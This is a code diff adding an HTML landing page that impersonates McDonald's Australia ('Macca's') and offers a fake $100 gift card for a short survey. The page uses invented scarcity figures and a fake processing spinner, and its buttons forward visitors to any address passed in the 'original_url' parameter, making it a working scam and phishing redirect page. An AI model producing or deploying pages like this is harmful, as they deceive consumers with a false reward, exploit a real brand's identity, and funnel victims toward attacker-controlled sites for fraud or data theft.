@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en-AU">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Macca's Australia - Feedback Challenge</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --mcd-red: #DA291C;
+            --mcd-yellow: #FFC220;
+            --mcd-dark: #27251F;
+            --mcd-light: #F8F9FA;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+
+        body {
+            background-color: var(--mcd-light);
+            color: var(--mcd-dark);
+            line-height: 1.4;
+            padding-bottom: 180px;
+        }
+
+        /* 顶部导航栏 */
+        .mcd-nav {
+            background: white;
+            padding: 12px 20px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 2000;
+        }
+
+        .nav-left { display: flex; align-items: center; }
+        
+        .nav-logo-text { 
+            color: var(--mcd-yellow);
+            font-size: 1.8rem;
+            font-weight: 900;
+            margin-right: 25px;
+            text-decoration: none;
+            letter-spacing: -1px;
+            font-family: 'Arial Black', Gadget, sans-serif;
+            text-shadow: 1px 1px 0px rgba(0,0,0,0.1);
+        }
+
+        .nav-links { display: flex; gap: 15px; font-size: 0.85rem; color: #555; }
+        .nav-links span { cursor: pointer; font-weight: 500; }
+
+        .nav-right-btn {
+            background-color: var(--mcd-yellow);
+            color: var(--mcd-dark);
+            padding: 8px 18px;
+            border-radius: 20px;
+            font-weight: 900;
+            font-size: 0.8rem;
+            text-transform: uppercase;
+        }
+
+        /* 主体容器 */
+        .container {
+            max-width: 750px;
+            margin: 0 auto;
+            background: white;
+            min-height: 400px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+        }
+
+        .header-hero {
+            background: linear-gradient(135deg, #DA291C 0%, #B31B15 100%);
+            color: white;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .header-hero h1 { font-weight: 900; letter-spacing: 1px; }
+
+        .amount-badge {
+            background-color: var(--mcd-yellow);
+            color: var(--mcd-red);
+            font-size: 2.2rem;
+            font-weight: 900;
+            padding: 8px 35px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-top: 15px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            transform: rotate(-1.5deg);
+        }
+
+        /* 图片容器与备用样式 */
+        .hero-img-container {
+            width: 100%;
+            background: #eee;
+            border-bottom: 5px solid var(--mcd-yellow);
+            min-height: 200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .hero-img-container img {
+            width: 100%;
+            max-width: 550px;
+            display: block;
+            height: auto;
+        }
+
+        .main-content { padding: 30px; }
+
+        /* 紧迫感盒子 */
+        .urgency-box {
+            background: #fff9e6;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid #ffeeba;
+            margin-bottom: 30px;
+        }
+
+        .progress-bar-bg {
+            background: #ddd;
+            height: 14px;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            background: linear-gradient(90deg, #2ecc71, #27ae60);
+            width: 87%;
+            height: 100%;
+        }
+
+        /* 步骤区域 */
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 35px;
+        }
+
+        .step-card {
+            text-align: center;
+            padding: 20px 10px;
+            background: #fcfcfc;
+            border: 1px solid #eee;
+            border-radius: 15px;
+        }
+
+        .step-num {
+            background: var(--mcd-red);
+            color: white;
+            width: 40px;
+            height: 40px;
+            line-height: 40px;
+            border-radius: 50%;
+            margin: 0 auto 12px;
+            font-weight: 900;
+        }
+
+        /* 底部固定条 */
+        .footer-cta {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background: white;
+            padding: 20px 20px 35px;
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.1);
+            border-top: 4px solid var(--mcd-red);
+            text-align: center;
+            z-index: 1001;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 18px 10px;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 900;
+            border: none;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: 0.2s;
+            display: block;
+        }
+
+        .btn-check { background: #eee; color: #666; box-shadow: 0 5px 0 #ccc; }
+        .btn-claim { background: var(--mcd-yellow); color: var(--mcd-dark); box-shadow: 0 5px 0 #d9a300; }
+        .btn:active { transform: translateY(3px); box-shadow: none; }
+
+        @media (max-width: 600px) {
+            .nav-links { display: none; }
+            .steps { grid-template-columns: 1fr; }
+            .header-hero h1 { font-size: 1.5rem; }
+            .btn { font-size: 0.9rem; }
+        }
+    </style>
+</head>
+
+<body>
+    <nav class="mcd-nav">
+        <div class="nav-left">
+            <div class="nav-logo-text">Macca's</div>
+            <div class="nav-links">
+                <span>Careers</span>
+                <span>MyMacca's</span>
+                <span>Offers</span>
+            </div>
+        </div>
+        <div class="nav-right-btn">Order Now</div>
+    </nav>
+
+    <div class="container">
+        <div class="header-hero">
+            <h1>SHARE YOUR FEEDBACK</h1>
+            <p>Exclusive Offer for Australian Residents</p>
+            <div class="amount-badge">GET A $100 GIFT CARD</div>
+        </div>
+
+        <div class="hero-img-container">
+            <img src="/bridge/109.png" alt="$100 Reward Card" onerror="this.parentElement.style.background='#DA291C'; this.parentElement.innerHTML='<h2 style=color:white>$100 GIFT CARD OFFER</h2>'">
+        </div>
+
+        <div class="main-content">
+            <div class="urgency-box">
+                <strong>Limited Time!</strong> Give us your feedback and you could be <strong>1 of 500 lucky winners</strong> this week!
+                <div class="progress-bar-bg">
+                    <div class="progress-bar-fill"></div>
+                </div>
+                <small>87% of Gift Cards Claimed Today</small>
+            </div>
+
+            <p style="text-align: center; font-weight: bold; margin-bottom: 25px; font-size: 1.1rem;">
+                Help us improve your experience by answering 3 simple questions.
+            </p>
+
+            <div class="steps">
+                <div class="step-card">
+                    <div class="step-num">1</div>
+                    <strong>Start Survey</strong><br><small>Begin challenge</small>
+                </div>
+                <div class="step-card">
+                    <div class="step-num">2</div>
+                    <strong>Feedback</strong><br><small>Takes ~1 min</small>
+                </div>
+                <div class="step-card">
+                    <div class="step-num">3</div>
+                    <strong>Get $100</strong><br><small>Via Email</small>
+                </div>
+            </div>
+
+            <p style="font-size: 0.8rem; color: #999; text-align: center; border-top: 1px solid #eee; padding-top: 20px;">
+                * T&Cs apply. This promotion is for market research purposes. Must be aged 18+. Not directly affiliated with global McDonald's Corp.
+            </p>
+        </div>
+    </div>
+
+    <div class="footer-cta">
+        <p style="font-weight: 900; color: var(--mcd-red); margin-bottom: 15px; text-transform: uppercase;">Ready to receive your reward?</p>
+        <div class="btn-group">
+            <button class="btn btn-check" onclick="go(this)">Check Eligibility</button>
+            <button class="btn btn-claim" onclick="go(this)">Claim Yours Now <i class="fas fa-arrow-right" style="margin-left:5px;"></i></button>
+        </div>
+    </div>
+
+    <script>
+        function go(btn) {
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            btn.disabled = true;
+            setTimeout(() => {
+                const urlParams = new URLSearchParams(window.location.search);
+                window.location.href = urlParams.get('original_url') || "https://www.mcdonalds.com.au";
+            }, 800);
+        }
+    </script>
+</body>
+
+</html>
